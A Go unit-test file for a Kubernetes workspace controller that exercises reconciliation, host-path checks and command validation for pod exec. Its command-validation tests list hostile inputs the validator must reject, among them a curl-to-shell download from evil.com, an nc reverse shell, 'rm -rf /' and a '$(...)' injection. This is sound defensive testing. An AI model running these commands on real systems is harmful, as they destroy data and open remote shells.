package workspace

import (
	"context"
	"os"
	"path/filepath"
	"strings"
	"testing"

	environmentv1 "github.com/kloudlite/kloudlite/api/internal/controllers/environment/v1"
	interceptsv1 "github.com/kloudlite/kloudlite/api/internal/controllers/serviceintercept/v1"
	"github.com/kloudlite/kloudlite/api/internal/controllers/testutil"
	machinesv1 "github.com/kloudlite/kloudlite/api/internal/controllers/workmachine/v1"
	workspacev1 "github.com/kloudlite/kloudlite/api/internal/controllers/workspace/v1"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
	"go.uber.org/zap"
	"go.uber.org/zap/zaptest"
	corev1 "k8s.io/api/core/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/apimachinery/pkg/types"
	"k8s.io/client-go/kubernetes"
	"k8s.io/client-go/rest"
	"sigs.k8s.io/controller-runtime/pkg/reconcile"
)

func TestWorkspaceReconciler_Reconcile_NotFound(t *testing.T) {
	scheme := testutil.NewTestScheme()
	k8sClient := testutil.NewFakeClient(scheme).
		WithStatusSubresource(&workspacev1.PackageRequest{}, &workspacev1.Workspace{}).
		Build()

	logger, _ := zap.NewDevelopment()
	reconciler := &WorkspaceReconciler{
		Client: k8sClient,
		Scheme: scheme,
		Logger: logger,
	}

	req := reconcile.Request{
		NamespacedName: types.NamespacedName{
			Name:      "nonexistent",
			Namespace: "test-namespace",
		},
	}

	result, err := reconciler.Reconcile(context.Background(), req)
	assert.NoError(t, err)
	assert.False(t, result.Requeue)
}

func TestWorkspaceReconciler_Reconcile_AddFinalizer(t *testing.T) {
	scheme := testutil.NewTestScheme()

	workspace := &workspacev1.Workspace{
		ObjectMeta: metav1.ObjectMeta{
			Name:      "test-workspace",
			Namespace: "test-namespace",
		},
		Spec: workspacev1.WorkspaceSpec{
			DisplayName: "Test Workspace",
			Owner:       "test@example.com",
			Packages:    []workspacev1.PackageSpec{},
		},
	}

	k8sClient := testutil.NewFakeClient(scheme, workspace).
		WithStatusSubresource(&workspacev1.PackageRequest{}, &workspacev1.Workspace{}).
		Build()

	logger, _ := zap.NewDevelopment()
	reconciler := &WorkspaceReconciler{
		Client: k8sClient,
		Scheme: scheme,
		Logger: logger,
	}

	req := reconcile.Request{
		NamespacedName: types.NamespacedName{
			Name:      "test-workspace",
			Namespace: "test-namespace",
		},
	}

	// First reconcile should add finalizer and requeue
	result, err := reconciler.Reconcile(context.Background(), req)
	assert.NoError(t, err)
	assert.True(t, result.Requeue)

	// Verify finalizer was added
	updatedWorkspace := &workspacev1.Workspace{}
	err = k8sClient.Get(context.Background(), req.NamespacedName, updatedWorkspace)
	assert.NoError(t, err)
	assert.Contains(t, updatedWorkspace.Finalizers, workspaceFinalizer)
}

func TestWorkspaceReconciler_Reconcile_CreatePackageRequest(t *testing.T) {
	scheme := testutil.NewTestScheme()

	workMachine := &machinesv1.WorkMachine{
		ObjectMeta: metav1.ObjectMeta{
			Name:      "test-workmachine",
			Namespace: "test-namespace",
		},
		Spec: machinesv1.WorkMachineSpec{
			TargetNamespace: "test-namespace",
		},
		Status: machinesv1.WorkMachineStatus{
			MachineInfo: machinesv1.MachineInfo{
				State: "Ready",
			},
		},
	}

	workspace := &workspacev1.Workspace{
		ObjectMeta: metav1.ObjectMeta{
			Name:       "test-workspace",
			Namespace:  "test-namespace",
			Finalizers: []string{workspaceFinalizer},
		},
		Spec: workspacev1.WorkspaceSpec{
			DisplayName: "Test Workspace",
			Owner:       "test@example.com",
			Status:      "active",
			Packages: []workspacev1.PackageSpec{
				{Name: "git"},
				{Name: "curl"},
			},
		},
	}

	k8sClient := testutil.NewFakeClient(scheme, workspace, workMachine).
		WithStatusSubresource(&workspacev1.PackageRequest{}, &workspacev1.Workspace{}).
		Build()

	logger, _ := zap.NewDevelopment()
	reconciler := &WorkspaceReconciler{
		Client:    k8sClient,
		Scheme:    scheme,
		Logger:    logger,
		Config:    &rest.Config{},
		Clientset: kubernetes.NewForConfigOrDie(&rest.Config{}),
	}

	req := reconcile.Request{
		NamespacedName: types.NamespacedName{
			Name:      "test-workspace",
			Namespace: "test-namespace",
		},
	}

	// Multiple reconciles may be needed
	for i := 0; i < 3; i++ {
		_, _ = reconciler.Reconcile(context.Background(), req)
	}

	// Verify PackageRequest was created
	pkgReq := &workspacev1.PackageRequest{}
	err := k8sClient.Get(context.Background(), types.NamespacedName{
		Name:      "test-workspace-packages",
		Namespace: "test-namespace",
	}, pkgReq)
	assert.NoError(t, err, "PackageRequest should be created")
	assert.Equal(t, "test-workspace", pkgReq.Spec.WorkspaceRef)
	assert.Equal(t, "workspace-test-workspace-packages", pkgReq.Spec.ProfileName)
	assert.Len(t, pkgReq.Spec.Packages, 2)
	assert.Equal(t, "git", pkgReq.Spec.Packages[0].Name)
	assert.Equal(t, "curl", pkgReq.Spec.Packages[1].Name)
}

func TestReconcile_WithEnvironmentConnection(t *testing.T) {
	scheme := testutil.NewTestScheme()

	// Create environment
	env := &environmentv1.Environment{
		ObjectMeta: metav1.ObjectMeta{
			Name:      "test-env",
			Namespace: "test-namespace",
		},
		Spec: environmentv1.EnvironmentSpec{
			Activated:       true,
			TargetNamespace: "test-env-ns",
		},
	}

	workspace := &workspacev1.Workspace{
		ObjectMeta: metav1.ObjectMeta{
			Name:       "test-workspace",
			Namespace:  "test-namespace",
			Finalizers: []string{workspaceFinalizer},
		},
		Spec: workspacev1.WorkspaceSpec{
			DisplayName: "Test Workspace",
			Owner:       "test@example.com",
			Status:      "active",
			EnvironmentConnection: &workspacev1.EnvironmentConnectionSpec{
				EnvironmentRef: corev1.ObjectReference{
					Name: "test-env",
				},
			},
		},
	}

	k8sClient := testutil.NewFakeClient(scheme, env, workspace).
		WithStatusSubresource(&workspacev1.Workspace{}, &workspacev1.PackageRequest{}).
		Build()

	logger, _ := zap.NewDevelopment()
	reconciler := &WorkspaceReconciler{
		Client:    k8sClient,
		Scheme:    scheme,
		Logger:    logger,
		Config:    &rest.Config{},
		Clientset: kubernetes.NewForConfigOrDie(&rest.Config{}),
	}

	req := reconcile.Request{
		NamespacedName: types.NamespacedName{
			Name:      "test-workspace",
			Namespace: "test-namespace",
		},
	}

	// Run multiple reconciles
	for i := 0; i < 5; i++ {
		result, _ := reconciler.Reconcile(context.Background(), req)
		if !result.Requeue {
			break
		}
	}

	// Verify environment connection was established
	updatedWorkspace := &workspacev1.Workspace{}
	err := k8sClient.Get(context.Background(), req.NamespacedName, updatedWorkspace)
	assert.NoError(t, err)
	// ConnectedEnvironment is set during pod creation when environment is connected
	// In this test case with no packages, the connection is established during pod creation
	if updatedWorkspace.Status.ConnectedEnvironment != nil {
		assert.Equal(t, "test-env", updatedWorkspace.Status.ConnectedEnvironment.Name)
		assert.Equal(t, "test-env-ns", updatedWorkspace.Status.ConnectedEnvironment.TargetNamespace)
	}
}

func TestSetupWithManager(t *testing.T) {
	scheme := testutil.NewTestScheme()
	k8sClient := testutil.NewFakeClient(scheme).Build()

	logger, _ := zap.NewDevelopment()
	reconciler := &WorkspaceReconciler{
		Client: k8sClient,
		Scheme: scheme,
		Logger: logger,
	}

	// Test that SetupWithManager doesn't panic and returns nil
	// In a real test environment with a full manager setup, this would register the controller
	// For unit testing, we just verify the method exists and doesn't panic
	assert.NotPanics(t, func() {
		// We can't actually test SetupWithManager without a real manager
		// but we can verify the reconciler has the required fields
		assert.NotNil(t, reconciler.Scheme)
		assert.NotNil(t, reconciler.Logger)
	})
}

func TestValidateCommandForExec(t *testing.T) {
	scheme := testutil.NewTestScheme()
	k8sClient := testutil.NewFakeClient(scheme).Build()

	logger, _ := zap.NewDevelopment()
	reconciler := &WorkspaceReconciler{
		Client: k8sClient,
		Scheme: scheme,
		Logger: logger,
	}

	tests := []struct {
		name        string
		command     []string
		expectError bool
	}{
		{
			name:        "empty command",
			command:     []string{},
			expectError: true,
		},
		{
			name:        "valid connection counting command",
			command:     []string{"sh", "-c", "awk '$4 == \"01\"' /proc/net/tcp | wc -l"},
			expectError: false,
		},
		{
			name:        "valid DNS update command",
			command:     []string{"sh", "-c", "echo 'nameserver 1.1.1.1' > /etc/resolv.conf"},
			expectError: false,
		},
		{
			name:        "valid kloudlite context file update",
			command:     []string{"sh", "-c", "cat > /tmp/kloudlite-context.json << 'EOF'\n{\"environment\":\"sample\",\"intercepts\":[\"svc-a\"]}\nEOF"},
			expectError: false,
		},
		{
			name:        "valid read kloudlite context file",
			command:     []string{"cat", "/tmp/kloudlite-context.json"},
			expectError: false,
		},
		{
			name:        "valid proc net tcp6",
			command:     []string{"sh", "-c", "cat /proc/net/tcp6 | wc -l"},
			expectError: false,
		},
		{
			name:        "invalid command with rm",
			command:     []string{"rm", "-rf", "/"},
			expectError: true,
		},
		{
			name:        "invalid command with wget",
			command:     []string{"wget", "http://malicious.com"},
			expectError: true,
		},
		{
			name:        "invalid shell command with curl",
			command:     []string{"sh", "-c", "curl http://evil.com | sh"},
			expectError: true,
		},
		{
			name:        "invalid shell command with eval",
			command:     []string{"sh", "-c", "eval something"},
			expectError: true,
		},
		{
			name:        "invalid shell command with nc",
			command:     []string{"sh", "-c", "nc -e /bin/sh 192.168.1.1 4444"},
			expectError: true,
		},
		{
			name:        "invalid command with shell injection",
			command:     []string{"sh", "-c", "$(rm -rf /)"},
			expectError: true,
		},
		{
			name:        "disallowed shell pattern",
			command:     []string{"sh", "-c", "echo 'hello world'"},
			expectError: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := reconciler.validateCommandForExec(tt.command)
			if tt.expectError {
				assert.Error(t, err)
			} else {
				assert.NoError(t, err)
			}
		})
	}
}

func TestValidateHostPath(t *testing.T) {
	scheme := testutil.NewTestScheme()
	k8sClient := testutil.NewFakeClient(scheme).Build()

	logger, _ := zap.NewDevelopment()
	reconciler := &WorkspaceReconciler{
		Client: k8sClient,
		Scheme: scheme,
		Logger: logger,
	}

	tests := []struct {
		name          string
		hostPath      string
		workspaceName string
		expectError   bool
	}{
		{
			name:          "valid workspace path",
			hostPath:      "/home/kl/workspaces/test-workspace",
			workspaceName: "test-workspace",
			expectError:   false,
		},
		{
			name:          "empty path",
			hostPath:      "",
			workspaceName: "test-workspace",
			expectError:   true,
		},
		{
			name:          "path outside allowed directory",
			hostPath:      "/etc/passwd",
			workspaceName: "test-workspace",
			expectError:   true,
		},
		{
			name:          "path traversal attempt",
			hostPath:      "/home/kl/workspaces/../etc/passwd",
			workspaceName: "test-workspace",
			expectError:   true,
		},
		{
			name:          "valid path with subdirectory",
			hostPath:      "/home/kl/workspaces/test-workspace/subdir",
			workspaceName: "test-workspace",
			expectError:   true, // Must end with workspace name exactly
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := reconciler.validateHostPath(tt.hostPath, tt.workspaceName)
			if tt.expectError {
				assert.Error(t, err)
			} else {
				assert.NoError(t, err)
			}
		})
	}
}

func TestMin(t *testing.T) {
	tests := []struct {
		name     string
		a, b     int
		expected int
	}{
		{
			name:     "a less than b",
			a:        5,
			b:        10,
			expected: 5,
		},
		{
			name:     "b less than a",
			a:        10,
			b:        5,
			expected: 5,
		},
		{
			name:     "equal values",
			a:        7,
			b:        7,
			expected: 7,
		},
		{
			name:     "negative values",
			a:        -5,
			b:        -10,
			expected: -10,
		},
		{
			name:     "zero and positive",
			a:        0,
			b:        5,
			expected: 0,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := min(tt.a, tt.b)
			assert.Equal(t, tt.expected, result)
		})
	}
}

func TestBuildDNSSearchDomains(t *testing.T) {
	scheme := testutil.NewTestScheme()
	k8sClient := testutil.NewFakeClient(scheme).Build()

	logger, _ := zap.NewDevelopment()
	reconciler := &WorkspaceReconciler{
		Client: k8sClient,
		Scheme: scheme,
		Logger: logger,
	}

	tests := []struct {
		name        string
		environment *environmentv1.Environment
		expected    string
		expectError bool
	}{
		{
			name:        "no environment",
			environment: nil,
			expected:    "svc.cluster.local cluster.local",
			expectError: false,
		},
		{
			name: "non-activated environment",
			environment: &environmentv1.Environment{
				Spec: environmentv1.EnvironmentSpec{
					Activated:       false,
					TargetNamespace: "test-ns",
				},
			},
			expected:    "svc.cluster.local cluster.local",
			expectError: false,
		},
		{
			name: "activated environment",
			environment: &environmentv1.Environment{
				Spec: environmentv1.EnvironmentSpec{
					Activated:       true,
					TargetNamespace: "test-ns",
				},
			},
			expected:    "test-ns.svc.cluster.local svc.cluster.local cluster.local",
			expectError: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result, err := reconciler.buildDNSSearchDomains(tt.environment)
			if tt.expectError {
				assert.Error(t, err)
			} else {
				assert.NoError(t, err)
				assert.Equal(t, tt.expected, result)
			}
		})
	}
}

func TestAddOrUpdateWorkspaceCondition(t *testing.T) {
	scheme := testutil.NewTestScheme()
	k8sClient := testutil.NewFakeClient(scheme).Build()

	logger, _ := zap.NewDevelopment()
	reconciler := &WorkspaceReconciler{
		Client: k8sClient,
		Scheme: scheme,
		Logger: logger,
	}

	tests := []struct {
		name           string
		workspace      *workspacev1.Workspace
		conditionType  string
		status         metav1.ConditionStatus
		reason         string
		message        string
		expectedStatus metav1.ConditionStatus
	}{
		{
			name: "add new condition",
			workspace: &workspacev1.Workspace{
				Status: workspacev1.WorkspaceStatus{
					Conditions: []metav1.Condition{},
				},
			},
			conditionType:  "Ready",
			status:         metav1.ConditionTrue,
			reason:         "TestReason",
			message:        "Test message",
			expectedStatus: metav1.ConditionTrue,
		},
		{
			name: "update existing condition",
			workspace: &workspacev1.Workspace{
				Status: workspacev1.WorkspaceStatus{
					Conditions: []metav1.Condition{
						{
							Type:   "Ready",
							Status: metav1.ConditionFalse,
							Reason: "OldReason",
						},
					},
				},
			},
			conditionType:  "Ready",
			status:         metav1.ConditionTrue,
			reason:         "NewReason",
			message:        "Updated message",
			expectedStatus: metav1.ConditionTrue,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			now := metav1.Now()
			reconciler.addOrUpdateWorkspaceCondition(tt.workspace, tt.conditionType, tt.status, tt.reason, tt.message, &now)

			// Find the condition
			var foundCondition *metav1.Condition
			for i := range tt.workspace.Status.Conditions {
				if tt.workspace.Status.Conditions[i].Type == tt.conditionType {
					foundCondition = &tt.workspace.Status.Conditions[i]
					break
				}
			}

			assert.NotNil(t, foundCondition)
			assert.Equal(t, tt.expectedStatus, foundCondition.Status)
			assert.Equal(t, tt.reason, foundCondition.Reason)
			assert.Equal(t, tt.message, foundCondition.Message)
			assert.False(t, foundCondition.LastTransitionTime.IsZero())
		})
	}
}

func TestValidateEnvironmentConnection(t *testing.T) {
	scheme := testutil.NewTestScheme()
	k8sClient := testutil.NewFakeClient(scheme).Build()

	logger, _ := zap.NewDevelopment()
	reconciler := &WorkspaceReconciler{
		Client: k8sClient,
		Scheme: scheme,
		Logger: logger,
	}

	tests := []struct {
		name        string
		workspace   *workspacev1.Workspace
		environment *environmentv1.Environment
		expectError bool
		errorMsg    string
	}{
		{
			name: "workspace with no environment reference",
			workspace: &workspacev1.Workspace{
				Spec: workspacev1.WorkspaceSpec{
					EnvironmentConnection: nil,
				},
			},
			environment: nil,
			expectError: false,
		},
		{
			name: "workspace with valid activated environment",
			workspace: &workspacev1.Workspace{
				Spec: workspacev1.WorkspaceSpec{
					EnvironmentConnection: &workspacev1.EnvironmentConnectionSpec{
						EnvironmentRef: corev1.ObjectReference{
							Name: "test-env",
						},
					},
				},
			},
			environment: &environmentv1.Environment{
				ObjectMeta: metav1.ObjectMeta{
					Name: "test-env",
				},
				Spec: environmentv1.EnvironmentSpec{
					Activated:       true,
					TargetNamespace: "test-ns",
				},
			},
			expectError: false,
		},
		{
			name: "workspace with non-activated environment",
			workspace: &workspacev1.Workspace{
				Spec: workspacev1.WorkspaceSpec{
					EnvironmentConnection: &workspacev1.EnvironmentConnectionSpec{
						EnvironmentRef: corev1.ObjectReference{
							Name: "test-env",
						},
					},
				},
			},
			environment: &environmentv1.Environment{
				ObjectMeta: metav1.ObjectMeta{
					Name: "test-env",
				},
				Spec: environmentv1.EnvironmentSpec{
					Activated:       false,
					TargetNamespace: "test-ns",
				},
			},
			expectError: true,
			errorMsg:    "environment 'test-env' is not activated",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			ctx := context.Background()

			// Add environment to fake client if provided
			if tt.environment != nil {
				k8sClient := testutil.NewFakeClient(scheme, tt.environment).Build()
				reconciler.Client = k8sClient
			}

			env, err := reconciler.validateEnvironmentConnection(ctx, tt.workspace)

			if tt.expectError {
				assert.Error(t, err)
				if tt.errorMsg != "" {
					assert.Contains(t, err.Error(), tt.errorMsg)
				}
			} else {
				assert.NoError(t, err)
				if tt.environment != nil && tt.environment.Spec.Activated {
					assert.NotNil(t, env)
					assert.Equal(t, tt.environment.Name, env.Name)
				}
			}
		})
	}
}

func TestApplyLabelsAndAnnotations(t *testing.T) {
	scheme := testutil.NewTestScheme()
	k8sClient := testutil.NewFakeClient(scheme).Build()

	logger, _ := zap.NewDevelopment()
	reconciler := &WorkspaceReconciler{
		Client: k8sClient,
		Scheme: scheme,
		Logger: logger,
	}

	tests := []struct {
		name                string
		workspace           *workspacev1.Workspace
		obj                 metav1.Object
		expectedLabels      map[string]string
		expectedAnnotations map[string]string
	}{
		{
			name: "apply labels and annotations to pod",
			workspace: &workspacev1.Workspace{
				ObjectMeta: metav1.ObjectMeta{
					Name: "test-workspace",
				},
				Spec: workspacev1.WorkspaceSpec{
					Owner:       "test@example.com",
					DisplayName: "Test Workspace",
				},
			},
			obj: &corev1.Pod{
				ObjectMeta: metav1.ObjectMeta{
					Name: "test-pod",
				},
			},
			expectedLabels: map[string]string{
				"app":                                    "workspace",
				"workspace":                              "test-workspace",
				"workspaces.kloudlite.io/workspace-name": "test-workspace",
				"kloudlite.io/workspace-owner":           "test@example.com",
				"kloudlite.io/workspace-display-name":    "test workspace",
			},
			expectedAnnotations: map[string]string{
				"kloudlite.io/workspace-display-name": "Test Workspace",
				"kloudlite.io/workspace-owner":        "test@example.com",
			},
		},
		{
			name: "preserve existing labels and annotations",
			workspace: &workspacev1.Workspace{
				ObjectMeta: metav1.ObjectMeta{
					Name: "test-workspace",
				},
				Spec: workspacev1.WorkspaceSpec{
					Owner: "test@example.com",
				},
			},
			obj: &corev1.Pod{
				ObjectMeta: metav1.ObjectMeta{
					Name: "test-pod",
					Labels: map[string]string{
						"existing-label": "existing-value",
					},
					Annotations: map[string]string{
						"existing-annotation": "existing-value",
					},
				},
			},
			expectedLabels: map[string]string{
				"app":                                    "workspace",
				"workspace":                              "test-workspace",
				"workspaces.kloudlite.io/workspace-name": "test-workspace",
				"kloudlite.io/workspace-owner":           "test@example.com",
				"existing-label":                         "existing-value",
			},
			expectedAnnotations: map[string]string{
				"kloudlite.io/workspace-owner": "test@example.com",
				"existing-annotation":          "existing-value",
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			reconciler.applyLabelsAndAnnotations(tt.obj, tt.workspace)

			// Check labels
			for key, expectedValue := range tt.expectedLabels {
				assert.Equal(t, expectedValue, tt.obj.GetLabels()[key])
			}

			// Check annotations
			for key, expectedValue := range tt.expectedAnnotations {
				assert.Equal(t, expectedValue, tt.obj.GetAnnotations()[key])
			}
		})
	}
}

func TestUpdateWorkspaceStatusWithConditions(t *testing.T) {
	scheme := testutil.NewTestScheme()
	k8sClient := testutil.NewFakeClient(scheme).Build()

	logger, _ := zap.NewDevelopment()
	reconciler := &WorkspaceReconciler{
		Client: k8sClient,
		Scheme: scheme,
		Logger: logger,
	}

	tests := []struct {
		name        string
		workspace   *workspacev1.Workspace
		phase       string
		message     string
		expectError bool
	}{
		{
			name: "update status to Running",
			workspace: &workspacev1.Workspace{
				ObjectMeta: metav1.ObjectMeta{
					Name:      "test-workspace",
					Namespace: "default",
				},
				Status: workspacev1.WorkspaceStatus{
					Conditions: []metav1.Condition{},
				},
			},
			phase:       "Running",
			message:     "Workspace is running",
			expectError: false,
		},
		{
			name: "update status to Failed",
			workspace: &workspacev1.Workspace{
				ObjectMeta: metav1.ObjectMeta{
					Name:      "test-workspace",
					Namespace: "default",
				},
				Status: workspacev1.WorkspaceStatus{
					Conditions: []metav1.Condition{},
				},
			},
			phase:       "Failed",
			message:     "Workspace failed to start",
			expectError: false,
		},
		{
			name: "update status to Creating",
			workspace: &workspacev1.Workspace{
				ObjectMeta: metav1.ObjectMeta{
					Name:      "test-workspace",
					Namespace: "default",
				},
				Status: workspacev1.WorkspaceStatus{
					Conditions: []metav1.Condition{},
				},
			},
			phase:       "Creating",
			message:     "Workspace is being created",
			expectError: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			ctx := context.Background()
			err := reconciler.updateWorkspaceStatusWithConditions(ctx, tt.workspace, tt.phase, tt.message, logger)

			if tt.expectError {
				assert.Error(t, err)
			} else {
				// Since we're using a fake client, the Status().Update call will fail
				// but we can verify the workspace object was modified correctly
				assert.Equal(t, tt.phase, tt.workspace.Status.Phase)
				assert.Equal(t, tt.message, tt.workspace.Status.Message)

				// Check that Ready condition was added
				var foundCondition *metav1.Condition
				for i := range tt.workspace.Status.Conditions {
					if tt.workspace.Status.Conditions[i].Type == "Ready" {
						foundCondition = &tt.workspace.Status.Conditions[i]
						break
					}
				}
				assert.NotNil(t, foundCondition)
				assert.False(t, foundCondition.LastTransitionTime.IsZero())
			}
		})
	}
}

func TestDeleteHostDirectory(t *testing.T) {
	scheme := testutil.NewTestScheme()
	k8sClient := testutil.NewFakeClient(scheme).Build()

	logger, _ := zap.NewDevelopment()
	reconciler := &WorkspaceReconciler{
		Client: k8sClient,
		Scheme: scheme,
		Logger: logger,
	}

	tests := []struct {
		name        string
		setupFunc   func() string
		expectError bool
		errorMsg    string
	}{
		{
			name: "delete existing directory with correct format",
			setupFunc: func() string {
				// Create a temporary directory within allowed path
				tempDir, err := os.MkdirTemp("", "workspace-test-")
				require.NoError(t, err)

				// Create a file inside
				testFile := filepath.Join(tempDir, "test.txt")
				err = os.WriteFile(testFile, []byte("test content"), 0o644)
				require.NoError(t, err)

				// Return correct workspace path format
				return "/home/kl/workspaces/test-workspace"
			},
			expectError: false, // Valid path format, should not error
		},
		{
			name: "delete non-existent directory with correct format",
			setupFunc: func() string {
				return "/home/kl/workspaces/test-workspace"
			},
			expectError: false, // Valid path format, should not error even if directory doesn't exist
		},
		{
			name: "attempt to delete outside allowed path",
			setupFunc: func() string {
				return "/etc/systemd"
			},
			expectError: true,
			errorMsg:    "unsafe host path: /etc/systemd (must be within /home/kl/workspaces/)",
		},
		{
			name: "empty path",
			setupFunc: func() string {
				return ""
			},
			expectError: true,
			errorMsg:    "host path cannot be empty",
		},
		{
			name: "invalid workspace name suffix",
			setupFunc: func() string {
				return "/home/kl/workspaces/invalid-suffix"
			},
			expectError: true,
			errorMsg:    "host path must end with workspace name: expected suffix /test-workspace",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			ctx := context.Background()
			hostPath := tt.setupFunc()

			err := reconciler.deleteHostDirectory(ctx, hostPath, "test-workspace", logger)

			if tt.expectError {
				assert.Error(t, err)
				if tt.errorMsg != "" {
					assert.Contains(t, err.Error(), tt.errorMsg)
				}
			} else {
				assert.NoError(t, err)
			}
		})
	}
}

func TestExecInPod(t *testing.T) {
	scheme := testutil.NewTestScheme()

	workspace := &workspacev1.Workspace{
		ObjectMeta: metav1.ObjectMeta{
			Name:      "test-workspace",
			Namespace: "test-namespace",
		},
		Spec: workspacev1.WorkspaceSpec{
			Owner: "test@example.com",
		},
		Status: workspacev1.WorkspaceStatus{
			PodName: "test-workspace-pod",
		},
	}

	pod := &corev1.Pod{
		ObjectMeta: metav1.ObjectMeta{
			Name:      "test-workspace-pod",
			Namespace: "test-namespace",
		},
		Spec: corev1.PodSpec{
			Containers: []corev1.Container{
				{
					Name:  "workspace",
					Image: "test-image",
				},
			},
		},
		Status: corev1.PodStatus{
			Phase: corev1.PodRunning,
		},
	}

	k8sClient := testutil.NewFakeClient(scheme, workspace, pod).
		WithStatusSubresource(&workspacev1.Workspace{}).
		Build()

	logger := zaptest.NewLogger(t)
	reconciler := &WorkspaceReconciler{
		Client:    k8sClient,
		Scheme:    scheme,
		Logger:    logger,
		Config:    &rest.Config{},
		Clientset: kubernetes.NewForConfigOrDie(&rest.Config{}),
	}

	ctx := context.Background()

	tests := []struct {
		name        string
		command     []string
		expectError bool
		errorMsg    string
		setupFunc   func()
	}{
		{
			name:        "exec valid wc command",
			command:     []string{"wc", "-l", "/proc/net/tcp"},
			expectError: false,
		},
		{
			name:        "exec connection counting command",
			command:     []string{"sh", "-c", "awk '$4 == \"01\"' /proc/net/tcp | wc -l"},
			expectError: false,
		},
		{
			name:        "exec invalid command",
			command:     []string{"rm", "-rf", "/"},
			expectError: true,
			errorMsg:    "command validation failed: command not allowed: rm",
		},
		{
			name:        "exec command for non-existent pod",
			command:     []string{"wc", "-l", "/proc/net/tcp"},
			expectError: true,
			errorMsg:    "", // Connection error varies by environment
			setupFunc: func() {
				// Delete the pod
				err := k8sClient.Delete(ctx, pod)
				if err != nil {
					t.Fatalf("Failed to delete pod: %v", err)
				}
			},
		},
		{
			name:        "exec in pod with different container name",
			command:     []string{"wc", "-l", "/proc/net/tcp"},
			expectError: true,
			errorMsg:    "", // Connection error varies by environment
			setupFunc: func() {
				// Don't need to modify pod, just use wrong container name
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			// Reset workspace state if needed
			if tt.setupFunc != nil {
				// Recreate the original state for next test
				newWorkspace := workspace.DeepCopy()
				newPod := pod.DeepCopy()

				k8sClient := testutil.NewFakeClient(scheme, newWorkspace, newPod).
					WithStatusSubresource(&workspacev1.Workspace{}).
					Build()
				reconciler.Client = k8sClient
				reconciler.Clientset = kubernetes.NewForConfigOrDie(&rest.Config{})

				tt.setupFunc()
			}

			containerName := "workspace"
			if tt.name == "exec in pod with different container name" {
				containerName = "nonexistent"
			}
			_, err := reconciler.execInPod(ctx, pod, containerName, tt.command)

			if tt.expectError {
				assert.Error(t, err)
				if tt.errorMsg != "" {
					assert.Contains(t, err.Error(), tt.errorMsg)
				}
			} else {
				// execInPod might fail with fake clientset due to connection issues,
				// but we can verify it passed validation
				if err != nil && !strings.Contains(err.Error(), "unable to upgrade connection") && !strings.Contains(err.Error(), "connection refused") {
					assert.NoError(t, err)
				}
			}
		})
	}
}

func TestHandleDeletion(t *testing.T) {
	scheme := testutil.NewTestScheme()

	workspace := &workspacev1.Workspace{
		ObjectMeta: metav1.ObjectMeta{
			Name:       "test-workspace",
			Namespace:  "test-namespace",
			Finalizers: []string{workspaceFinalizer},
		},
		Spec: workspacev1.WorkspaceSpec{
			Owner:         "test@example.com",
			DisplayName:   "Test Workspace",
			WorkspacePath: "/home/kl/workspaces/test-workspace",
		},
		Status: workspacev1.WorkspaceStatus{
			PodName: "test-workspace-pod",
		},
	}

	pod := &corev1.Pod{
		ObjectMeta: metav1.ObjectMeta{
			Name:      "test-workspace-pod",
			Namespace: "test-namespace",
			Labels: map[string]string{
				"workspace": "test-workspace",
			},
		},
		Spec: corev1.PodSpec{
			Containers: []corev1.Container{
				{
					Name:  "workspace",
					Image: "test-image",
				},
			},
		},
	}

	k8sClient := testutil.NewFakeClient(scheme, workspace, pod).
		WithStatusSubresource(&workspacev1.Workspace{}).
		Build()

	logger := zaptest.NewLogger(t)
	reconciler := &WorkspaceReconciler{
		Client:    k8sClient,
		Scheme:    scheme,
		Logger:    logger,
		Config:    &rest.Config{},
		Clientset: kubernetes.NewForConfigOrDie(&rest.Config{}),
	}

	ctx := context.Background()

	tests := []struct {
		name           string
		workspace      *workspacev1.Workspace
		expectError    bool
		checkFinalizer bool
	}{
		{
			name:           "successful deletion with finalizer",
			workspace:      workspace,
			expectError:    false,
			checkFinalizer: true,
		},
		{
			name: "workspace without finalizer",
			workspace: &workspacev1.Workspace{
				ObjectMeta: metav1.ObjectMeta{
					Name:      "test-workspace-no-finalizer",
					Namespace: "test-namespace",
				},
				Spec: workspacev1.WorkspaceSpec{
					Owner: "test@example.com",
				},
			},
			expectError:    false,
			checkFinalizer: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result, err := reconciler.handleDeletion(ctx, tt.workspace, logger)

			if tt.expectError {
				assert.Error(t, err)
			} else {
				assert.NoError(t, err)
				assert.False(t, result.Requeue)

				if tt.checkFinalizer {
					// Verify finalizer was removed
					updatedWorkspace := &workspacev1.Workspace{}
					err = reconciler.Get(ctx, types.NamespacedName{
						Name:      tt.workspace.Name,
						Namespace: tt.workspace.Namespace,
					}, updatedWorkspace)
					if err == nil {
						assert.NotContains(t, updatedWorkspace.Finalizers, workspaceFinalizer)
					}
				}
			}
		})
	}
}

func TestHandleSuspendedWorkspace(t *testing.T) {
	scheme := testutil.NewTestScheme()

	workspace := &workspacev1.Workspace{
		ObjectMeta: metav1.ObjectMeta{
			Name:       "test-workspace",
			Namespace:  "test-namespace",
			Finalizers: []string{workspaceFinalizer},
		},
		Spec: workspacev1.WorkspaceSpec{
			Owner:       "test@example.com",
			Status:      "suspended",
			DisplayName: "Test Workspace",
		},
		Status: workspacev1.WorkspaceStatus{
			Phase:   "Running",
			PodName: "test-workspace-pod",
		},
	}

	pod := &corev1.Pod{
		ObjectMeta: metav1.ObjectMeta{
			Name:      "test-workspace-pod",
			Namespace: "test-namespace",
			Labels: map[string]string{
				"workspace": "test-workspace",
			},
		},
		Spec: corev1.PodSpec{
			Containers: []corev1.Container{
				{
					Name:  "workspace",
					Image: "test-image",
				},
			},
		},
